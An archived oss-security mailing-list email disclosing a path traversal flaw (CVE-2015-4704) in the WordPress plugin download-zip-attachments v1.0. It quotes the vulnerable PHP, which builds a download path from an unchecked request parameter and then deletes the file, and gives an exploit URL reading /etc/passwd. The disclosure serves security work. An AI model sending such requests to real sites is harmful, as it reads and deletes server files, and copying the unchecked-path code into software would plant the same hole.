X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1194" "Tuesday" "23" "June" "2015" "16:07:49" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<B84727D4-14F8-42D7-B115-D5AD2D9DCCF4@me.com>" "34" "[oss-security] Remote file download vulnerability in download-zip-attachments v1.0" nil nil nil "6" "2015062320:07:49" "[oss-security] Remote file download vulnerability in download-zip-attachments v1.0" (number mark "U       larry0@me.co Jun 23   34/1194  " thread-indent "\"[oss-security] Remote file download vulnerability in download-zip-attachments v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3440 invoked by uid 550); 23 Jun 2015 20:08:08 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3405 invoked from network); 23 Jun 2015 20:08:02 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-06-23_07:2015-06-23,2015-06-23,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506230320
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <B84727D4-14F8-42D7-B115-D5AD2D9DCCF4@me.com>
Date: Tue, 23 Jun 2015 16:07:49 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Remote file download vulnerability in download-zip-attachments v1.0

Title: Remote file download vulnerability in download-zip-attachments v1.0
Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-10
Download Site: https://wordpress.org/plugins/download-zip-attachments/
Vendor: rivenvirus
Vendor Notified: 2015-06-15
Vendor Contact: https://profiles.wordpress.org/rivenvirus/
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D129
Description:=20
Download all attachments from the post into a zip file.

Vulnerability:
from download-zip-attachments/download.php makes no checks to verify the do=
wnload path is with in the specified upload directory.

<?php
if(isset($_REQUEST['File']) && !empty($_REQUEST['File'])){
   define('WP_USE_THEMES', false);
   require('../../../wp-load.php');=20=20=20=20
   require "create_zip_file.php";
   $uploads =3D wp_upload_dir();=20
   $tmp_location =3D $uploads['path']."/".$_REQUEST['File'];
   //echo $tmp_location;
   $zip =3D new CreateZipFile;
   $zip->forceDownload($tmp_location,false);=20=20=20=20=20
   unlink($tmp_location);=20
   exit;
}

CVEID: 2015-4704
OSVDB:
Exploit Code:
	=E2=80=A2 http://www.example.com/wp-content/plugins/download-zip-attachmen=
ts/download.php?File=3D../../../../../../../../etc/passwd=
